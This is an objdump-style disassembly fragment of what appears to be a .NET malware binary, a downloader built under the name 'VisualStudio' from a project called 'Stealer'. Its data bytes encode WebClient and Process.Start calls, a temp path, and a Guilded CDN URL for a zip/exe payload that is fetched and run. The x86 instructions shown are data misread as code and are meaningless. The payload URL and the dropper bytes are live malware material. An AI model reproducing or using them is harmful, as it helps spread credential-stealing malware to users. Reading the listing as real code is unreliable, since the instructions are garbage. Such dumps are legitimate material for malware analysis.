  4025e4:	65 6d                	gs insl (%dx),%es:(%edi)
  4025e6:	70 50                	jo     0x402638
  4025e8:	61                   	popa
  4025e9:	74 68                	je     0x402653
  4025eb:	00 50 72             	add    %dl,0x72(%eax)
  4025ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4025ef:	67 72 61             	addr16 jb 0x402653
  4025f2:	6d                   	insl   (%dx),%es:(%edi)
  4025f3:	00 53 79             	add    %dl,0x79(%ebx)
  4025f6:	73 74                	jae    0x40266c
  4025f8:	65 6d                	gs insl (%dx),%es:(%edi)
  4025fa:	00 4d 61             	add    %cl,0x61(%ebp)
  4025fd:	69 6e 00 53 79 73 74 	imul   $0x74737953,0x0(%esi),%ebp
  402604:	65 6d                	gs insl (%dx),%es:(%edi)
  402606:	2e 52                	cs push %edx
  402608:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40260b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402610:	6e                   	outsb  %ds:(%esi),(%dx)
  402611:	00 45 78             	add    %al,0x78(%ebp)
  402614:	63 65 70             	arpl   %esp,0x70(%ebp)
  402617:	74 69                	je     0x402682
  402619:	6f                   	outsl  %ds:(%esi),(%dx)
  40261a:	6e                   	outsb  %ds:(%esi),(%dx)
  40261b:	00 67 65             	add    %ah,0x65(%edi)
  40261e:	74 5f                	je     0x40267f
  402620:	53                   	push   %ebx
  402621:	74 61                	je     0x402684
  402623:	72 74                	jb     0x402699
  402625:	49                   	dec    %ecx
  402626:	6e                   	outsb  %ds:(%esi),(%dx)
  402627:	66 6f                	outsw  %ds:(%esi),(%dx)
  402629:	00 50 72             	add    %dl,0x72(%eax)
  40262c:	6f                   	outsl  %ds:(%esi),(%dx)
  40262d:	63 65 73             	arpl   %esp,0x73(%ebp)
  402630:	73 53                	jae    0x402685
  402632:	74 61                	je     0x402695
  402634:	72 74                	jb     0x4026aa
  402636:	49                   	dec    %ecx
  402637:	6e                   	outsb  %ds:(%esi),(%dx)
  402638:	66 6f                	outsw  %ds:(%esi),(%dx)
  40263a:	00 56 69             	add    %dl,0x69(%esi)
  40263d:	73 75                	jae    0x4026b4
  40263f:	61                   	popa
  402640:	6c                   	insb   (%dx),%es:(%edi)
  402641:	53                   	push   %ebx
  402642:	74 75                	je     0x4026b9
  402644:	64 69 6f 00 46 69 6c 	imul   $0x656c6946,%fs:0x0(%edi),%ebp
  40264b:	65 
  40264c:	44                   	inc    %esp
  40264d:	6f                   	outsl  %ds:(%esi),(%dx)
  40264e:	77 6e                	ja     0x4026be
  402650:	6c                   	insb   (%dx),%es:(%edi)
  402651:	6f                   	outsl  %ds:(%esi),(%dx)
  402652:	61                   	popa
  402653:	64 65 72 00          	fs gs jb 0x402657
  402657:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40265c:	00 53 79             	add    %dl,0x79(%ebx)
  40265f:	73 74                	jae    0x4026d5
  402661:	65 6d                	gs insl (%dx),%es:(%edi)
  402663:	2e 44                	cs inc %esp
  402665:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  40266c:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  402673:	74 65                	je     0x4026da
  402675:	6d                   	insl   (%dx),%es:(%edi)
  402676:	2e 52                	cs push %edx
  402678:	75 6e                	jne    0x4026e8
  40267a:	74 69                	je     0x4026e5
  40267c:	6d                   	insl   (%dx),%es:(%edi)
  40267d:	65 2e 49             	gs cs dec %ecx
  402680:	6e                   	outsb  %ds:(%esi),(%dx)
  402681:	74 65                	je     0x4026e8
  402683:	72 6f                	jb     0x4026f4
  402685:	70 53                	jo     0x4026da
  402687:	65 72 76             	gs jb  0x402700
  40268a:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  402691:	73 74                	jae    0x402707
  402693:	65 6d                	gs insl (%dx),%es:(%edi)
  402695:	2e 52                	cs push %edx
  402697:	75 6e                	jne    0x402707
  402699:	74 69                	je     0x402704
  40269b:	6d                   	insl   (%dx),%es:(%edi)
  40269c:	65 2e 43             	gs cs inc %ebx
  40269f:	6f                   	outsl  %ds:(%esi),(%dx)
  4026a0:	6d                   	insl   (%dx),%es:(%edi)
  4026a1:	70 69                	jo     0x40270c
  4026a3:	6c                   	insb   (%dx),%es:(%edi)
  4026a4:	65 72 53             	gs jb  0x4026fa
  4026a7:	65 72 76             	gs jb  0x402720
  4026aa:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  4026b1:	62 75 67             	bound  %esi,0x67(%ebp)
  4026b4:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  4026bb:	65 
  4026bc:	73 00                	jae    0x4026be
  4026be:	61                   	popa
  4026bf:	72 67                	jb     0x402728
  4026c1:	73 00                	jae    0x4026c3
  4026c3:	50                   	push   %eax
  4026c4:	72 6f                	jb     0x402735
  4026c6:	63 65 73             	arpl   %esp,0x73(%ebp)
  4026c9:	73 00                	jae    0x4026cb
  4026cb:	45                   	inc    %ebp
  4026cc:	78 69                	js     0x402737
  4026ce:	73 74                	jae    0x402744
  4026d0:	73 00                	jae    0x4026d2
  4026d2:	43                   	inc    %ebx
  4026d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4026d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4026d5:	63 61 74             	arpl   %esp,0x74(%ecx)
  4026d8:	00 4f 62             	add    %cl,0x62(%edi)
  4026db:	6a 65                	push   $0x65
  4026dd:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  4026e1:	79 73                	jns    0x402756
  4026e3:	74 65                	je     0x40274a
  4026e5:	6d                   	insl   (%dx),%es:(%edi)
  4026e6:	2e 4e                	cs dec %esi
  4026e8:	65 74 00             	gs je  0x4026eb
  4026eb:	57                   	push   %edi
  4026ec:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  4026f0:	69 65 6e 74 00 53 74 	imul   $0x74530074,0x6e(%ebp),%esp
  4026f7:	61                   	popa
  4026f8:	72 74                	jb     0x40276e
  4026fa:	00 47 65             	add    %al,0x65(%edi)
  4026fd:	74 43                	je     0x402742
  4026ff:	75 72                	jne    0x402773
  402701:	72 65                	jb     0x402768
  402703:	6e                   	outsb  %ds:(%esi),(%dx)
  402704:	74 44                	je     0x40274a
  402706:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40270d:	79 00                	jns    0x40270f
  40270f:	00 00                	add    %al,(%eax)
  402711:	1d 53 00 74 00       	sbb    $0x740053,%eax
  402716:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40271a:	6c                   	insb   (%dx),%es:(%edi)
  40271b:	00 65 00             	add    %ah,0x0(%ebp)
  40271e:	72 00                	jb     0x402720
  402720:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  402724:	73 00                	jae    0x402726
  402726:	70 00                	jo     0x402728
  402728:	72 00                	jb     0x40272a
  40272a:	6f                   	outsl  %ds:(%esi),(%dx)
  40272b:	00 6a 00             	add    %ch,0x0(%edx)
  40272e:	00 80 bb 68 00 74    	add    %al,0x740068bb(%eax)
  402734:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  402738:	00 73 00             	add    %dh,0x0(%ebx)
  40273b:	3a 00                	cmp    (%eax),%al
  40273d:	2f                   	das
  40273e:	00 2f                	add    %ch,(%edi)
  402740:	00 69 00             	add    %ch,0x0(%ecx)
  402743:	6d                   	insl   (%dx),%es:(%edi)
  402744:	00 67 00             	add    %ah,0x0(%edi)
  402747:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  40274b:	75 00                	jne    0x40274d
  40274d:	69 00 6c 00 64 00    	imul   $0x64006c,(%eax),%eax
  402753:	65 00 64 00 63       	add    %ah,%gs:0x63(%eax,%eax,1)
  402758:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40275c:	00 2e                	add    %ch,(%esi)
  40275e:	00 63 00             	add    %ah,0x0(%ebx)
  402761:	6f                   	outsl  %ds:(%esi),(%dx)
  402762:	00 6d 00             	add    %ch,0x0(%ebp)
  402765:	2f                   	das
  402766:	00 43 00             	add    %al,0x0(%ebx)
  402769:	6f                   	outsl  %ds:(%esi),(%dx)
  40276a:	00 6e 00             	add    %ch,0x0(%esi)
  40276d:	74 00                	je     0x40276f
  40276f:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  402773:	74 00                	je     0x402775
  402775:	4d                   	dec    %ebp
  402776:	00 65 00             	add    %ah,0x0(%ebp)
  402779:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40277d:	61                   	popa
  40277e:	00 47 00             	add    %al,0x0(%edi)
  402781:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  402785:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  402789:	69 00 63 00 46 00    	imul   $0x460063,(%eax),%eax
  40278f:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  402795:	73 00                	jae    0x402797
  402797:	2f                   	das
  402798:	00 35 00 61 00 35    	add    %dh,0x35006100
  40279e:	00 62 00             	add    %ah,0x0(%edx)
  4027a1:	34 00                	xor    $0x0,%al
  4027a3:	37                   	aaa
  4027a4:	00 65 00             	add    %ah,0x0(%ebp)
  4027a7:	38 00                	cmp    %al,(%eax)
  4027a9:	62 00                	bound  %eax,(%eax)
  4027ab:	65 00 36             	add    %dh,%gs:(%esi)
  4027ae:	00 31                	add    %dh,(%ecx)
  4027b0:	00 62 00             	add    %ah,0x0(%edx)
  4027b3:	32 00                	xor    (%eax),%al
  4027b5:	31 00                	xor    %eax,(%eax)
  4027b7:	64 00 32             	add    %dh,%fs:(%edx)
  4027ba:	00 32                	add    %dh,(%edx)
  4027bc:	00 31                	add    %dh,(%ecx)
  4027be:	00 33                	add    %dh,(%ebx)
  4027c0:	00 32                	add    %dh,(%edx)
  4027c2:	00 35 00 65 00 37    	add    %dh,0x37006500
  4027c8:	00 64 00 35          	add    %ah,0x35(%eax,%eax,1)
  4027cc:	00 32                	add    %dh,(%edx)
  4027ce:	00 63 00             	add    %ah,0x0(%ebx)
  4027d1:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4027d5:	61                   	popa
  4027d6:	00 30                	add    %dh,(%eax)
  4027d8:	00 2d 00 46 00 75    	add    %ch,0x75004600
  4027de:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4027e2:	00 2e                	add    %ch,(%esi)
  4027e4:	00 7a 00             	add    %bh,0x0(%edx)
  4027e7:	69 00 70 00 01 09    	imul   $0x9010070,(%eax),%eax
  4027ed:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4027f1:	78 00                	js     0x4027f3
  4027f3:	65 00 00             	add    %al,%gs:(%eax)
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	fb                   	sti
  4027f9:	17                   	pop    %ss
  4027fa:	24 03                	and    $0x3,%al
  4027fc:	7b 9c                	jnp    0x40279a
  4027fe:	d3 45 a0             	roll   %cl,-0x60(%ebp)
  402801:	2e 93                	cs xchg %eax,%ebx
  402803:	28 b9 87 46 c3 00    	sub    %bh,0xc34687(%ecx)
  402809:	04 20                	add    $0x20,%al
  40280b:	01 01                	add    %eax,(%ecx)
  40280d:	08 03                	or     %al,(%ebx)
  40280f:	20 00                	and    %al,(%eax)
  402811:	01 05 20 01 01 11    	add    %eax,0x11010120
  402817:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  40281a:	01 01                	add    %eax,(%ecx)
  40281c:	0e                   	push   %cs
  40281d:	10 07                	adc    %al,(%edi)
  40281f:	0b 0e                	or     (%esi),%ecx
  402821:	0e                   	push   %cs
  402822:	0e                   	push   %cs
  402823:	0e                   	push   %cs
  402824:	02 12                	add    (%edx),%dl
  402826:	41                   	inc    %ecx
  402827:	12 45 0e             	adc    0xe(%ebp),%al
  40282a:	0e                   	push   %cs
  40282b:	0e                   	push   %cs
  40282c:	11 49 03             	adc    %ecx,0x3(%ecx)
  40282f:	00 00                	add    %al,(%eax)
  402831:	0e                   	push   %cs
  402832:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  402837:	0e                   	push   %cs
  402838:	04 00                	add    $0x0,%al
  40283a:	01 02                	add    %eax,(%edx)
  40283c:	0e                   	push   %cs
  40283d:	04 20                	add    $0x20,%al
  40283f:	00 12                	add    %dl,(%edx)
  402841:	5d                   	pop    %ebp
  402842:	03 20                	add    (%eax),%esp
  402844:	00 02                	add    %al,(%edx)
  402846:	04 00                	add    $0x0,%al
  402848:	00 11                	add    %dl,(%ecx)
  40284a:	49                   	dec    %ecx
  40284b:	03 20                	add    (%eax),%esp
  40284d:	00 0e                	add    %cl,(%esi)
  40284f:	05 20 02 01 0e       	add    $0xe010220,%eax
  402854:	0e                   	push   %cs
  402855:	05 00 01 12 41       	add    $0x41120100,%eax
  40285a:	0e                   	push   %cs
  40285b:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  402861:	34 e0                	xor    $0xe0,%al
  402863:	89 05 00 01 01 1d    	mov    %eax,0x1d010100
  402869:	0e                   	push   %cs
  40286a:	08 01                	or     %al,(%ecx)
  40286c:	00 08                	add    %cl,(%eax)
  40286e:	00 00                	add    %al,(%eax)
  402870:	00 00                	add    %al,(%eax)
  402872:	00 1e                	add    %bl,(%esi)
  402874:	01 00                	add    %eax,(%eax)
  402876:	01 00                	add    %eax,(%eax)
  402878:	54                   	push   %esp
  402879:	02 16                	add    (%esi),%dl
  40287b:	57                   	push   %edi
  40287c:	72 61                	jb     0x4028df
  40287e:	70 4e                	jo     0x4028ce
  402880:	6f                   	outsl  %ds:(%esi),(%dx)
  402881:	6e                   	outsb  %ds:(%esi),(%dx)
  402882:	45                   	inc    %ebp
  402883:	78 63                	js     0x4028e8
  402885:	65 70 74             	gs jo  0x4028fc
  402888:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40288f:	77 73                	ja     0x402904
  402891:	01 08                	add    %ecx,(%eax)
  402893:	01 00                	add    %eax,(%eax)
  402895:	07                   	pop    %es
  402896:	01 00                	add    %eax,(%eax)
  402898:	00 00                	add    %al,(%eax)
  40289a:	00 2c 01             	add    %ch,(%ecx,%eax,1)
  40289d:	00 27                	add    %ah,(%edi)
  40289f:	4d                   	dec    %ebp
  4028a0:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4028a7:	74 20                	je     0x4028c9
  4028a9:	56                   	push   %esi
  4028aa:	69 73 75 61 6c 20 53 	imul   $0x53206c61,0x75(%ebx),%esi
  4028b1:	74 75                	je     0x402928
  4028b3:	64 69 6f 20 53 6f 6c 	imul   $0x756c6f53,%fs:0x20(%edi),%ebp
  4028ba:	75 
  4028bb:	74 69                	je     0x402926
  4028bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4028be:	6e                   	outsb  %ds:(%esi),(%dx)
  4028bf:	20 28                	and    %ch,(%eax)
  4028c1:	2e 73 6c             	jae,pn 0x402930
  4028c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4028c5:	29 00                	sub    %eax,(%eax)
  4028c7:	00 05 01 00 00 00    	add    %al,0x1
  4028cd:	00 29                	add    %ch,(%ecx)
  4028cf:	01 00                	add    %eax,(%eax)
  4028d1:	24 38                	and    $0x38,%al
  4028d3:	33 31                	xor    (%ecx),%esi
  4028d5:	62 31                	bound  %esi,(%ecx)
  4028d7:	66 32 37             	data16 xor (%edi),%dh
  4028da:	2d 37 62 66 35       	sub    $0x35666237,%eax
  4028df:	2d 34 62 39 31       	sub    $0x31396234,%eax
  4028e4:	2d 62 34 62 66       	sub    $0x66623462,%eax
  4028e9:	2d 39 64 33 62       	sub    $0x62336439,%eax
  4028ee:	64 31 64 62 33       	xor    %esp,%fs:0x33(%edx,%eiz,2)
  4028f3:	34 33                	xor    $0x33,%al
  4028f5:	63 00                	arpl   %eax,(%eax)
  4028f7:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4028fa:	00 07                	add    %al,(%edi)
  4028fc:	31 2e                	xor    %ebp,(%esi)
  4028fe:	30 2e                	xor    %ch,(%esi)
  402900:	30 2e                	xor    %ch,(%esi)
  402902:	30 00                	xor    %al,(%eax)
  402904:	00 49 01             	add    %cl,0x1(%ecx)
  402907:	00 1a                	add    %bl,(%edx)
  402909:	2e 4e                	cs dec %esi
  40290b:	45                   	inc    %ebp
  40290c:	54                   	push   %esp
  40290d:	46                   	inc    %esi
  40290e:	72 61                	jb     0x402971
  402910:	6d                   	insl   (%dx),%es:(%edi)
  402911:	65 77 6f             	gs ja  0x402983
  402914:	72 6b                	jb     0x402981
  402916:	2c 56                	sub    $0x56,%al
  402918:	65 72 73             	gs jb  0x40298e
  40291b:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  402922:	38 01                	cmp    %al,(%ecx)
  402924:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  402928:	46                   	inc    %esi
  402929:	72 61                	jb     0x40298c
  40292b:	6d                   	insl   (%dx),%es:(%edi)
  40292c:	65 77 6f             	gs ja  0x40299e
  40292f:	72 6b                	jb     0x40299c
  402931:	44                   	inc    %esp
  402932:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  402939:	61                   	popa
  40293a:	6d                   	insl   (%dx),%es:(%edi)
  40293b:	65 12 2e             	adc    %gs:(%esi),%ch
  40293e:	4e                   	dec    %esi
  40293f:	45                   	inc    %ebp
  402940:	54                   	push   %esp
  402941:	20 46 72             	and    %al,0x72(%esi)
  402944:	61                   	popa
  402945:	6d                   	insl   (%dx),%es:(%edi)
  402946:	65 77 6f             	gs ja  0x4029b8
  402949:	72 6b                	jb     0x4029b6
  40294b:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  40294e:	38 00                	cmp    %al,(%eax)
  402950:	00 00                	add    %al,(%eax)
  402952:	00 00                	add    %al,(%eax)
  402954:	9f                   	lahf
  402955:	5a                   	pop    %edx
  402956:	82 f4 00             	xor    $0x0,%ah
  402959:	00 00                	add    %al,(%eax)
  40295b:	00 02                	add    %al,(%edx)
  40295d:	00 00                	add    %al,(%eax)
  40295f:	00 6e 00             	add    %ch,0x0(%esi)
  402962:	00 00                	add    %al,(%eax)
  402964:	88 29                	mov    %ch,(%ecx)
  402966:	00 00                	add    %al,(%eax)
  402968:	88 0b                	mov    %cl,(%ebx)
	...
  402976:	00 00                	add    %al,(%eax)
  402978:	10 00                	adc    %al,(%eax)
	...
  402986:	00 00                	add    %al,(%eax)
  402988:	52                   	push   %edx
  402989:	53                   	push   %ebx
  40298a:	44                   	inc    %esp
  40298b:	53                   	push   %ebx
  40298c:	e6 e3                	out    %al,$0xe3
  40298e:	e8 23 29 c1 01       	call   0x20152b6
  402993:	49                   	dec    %ecx
  402994:	96                   	xchg   %eax,%esi
  402995:	fc                   	cld
  402996:	71 4c                	jno    0x4029e4
  402998:	8b 2d 4e 5b 01 00    	mov    0x15b4e,%ebp
  40299e:	00 00                	add    %al,(%eax)
  4029a0:	43                   	inc    %ebx
  4029a1:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
  4029a5:	65 72 73             	gs jb  0x402a1b
  4029a8:	5c                   	pop    %esp
  4029a9:	55                   	push   %ebp
  4029aa:	4e                   	dec    %esi
  4029ab:	4b                   	dec    %ebx
  4029ac:	4e                   	dec    %esi
  4029ad:	4f                   	dec    %edi
  4029ae:	57                   	push   %edi
  4029af:	4e                   	dec    %esi
  4029b0:	5c                   	pop    %esp
  4029b1:	44                   	inc    %esp
  4029b2:	65 73 6b             	gs jae 0x402a20
  4029b5:	74 6f                	je     0x402a26
  4029b7:	70 5c                	jo     0x402a15
  4029b9:	69 6c 6c 65 67 61 6c 	imul   $0x706c6167,0x65(%esp,%ebp,2),%ebp
  4029c0:	70 
  4029c1:	72 6f                	jb     0x402a32
  4029c3:	6a 65                	push   $0x65
  4029c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4029c6:	69 6e 73 6c 6e 73 69 	imul   $0x69736e6c,0x73(%esi),%ebp
  4029cd:	5c                   	pop    %esp
  4029ce:	56                   	push   %esi
  4029cf:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%ebx),%esi
  4029d6:	75 64                	jne    0x402a3c
  4029d8:	69 6f 5c 6f 62 6a 5c 	imul   $0x5c6a626f,0x5c(%edi),%ebp
  4029df:	44                   	inc    %esp
  4029e0:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4029e4:	5c                   	pop    %esp
  4029e5:	56                   	push   %esi
  4029e6:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%ebx),%esi
  4029ed:	75 64                	jne    0x402a53
  4029ef:	69 6f 2e 70 64 62 00 	imul   $0x626470,0x2e(%edi),%ebp
  4029f6:	1e                   	push   %ds
  4029f7:	2a 00                	sub    (%eax),%al
	...
  402a01:	00 38                	add    %bh,(%eax)
  402a03:	2a 00                	sub    (%eax),%al
  402a05:	00 00                	add    %al,(%eax)
  402a07:	20 00                	and    %al,(%eax)
	...
  402a1d:	00 2a                	add    %ch,(%edx)
  402a1f:	2a 00                	sub    (%eax),%al
	...
  402a29:	00 00                	add    %al,(%eax)
  402a2b:	00 5f 43             	add    %bl,0x43(%edi)
  402a2e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a2f:	72 45                	jb     0x402a76
  402a31:	78 65                	js     0x402a98
  402a33:	4d                   	dec    %ebp
  402a34:	61                   	popa
  402a35:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  402a3c:	72 65                	jb     0x402aa3
  402a3e:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  402a42:	6c                   	insb   (%dx),%es:(%edi)
  402a43:	00 00                	add    %al,(%eax)
  402a45:	00 00                	add    %al,(%eax)
  402a47:	00 00                	add    %al,(%eax)
  402a49:	00 ff                	add    %bh,%bh
  402a4b:	25 00 20 40 00       	and    $0x402000,%eax
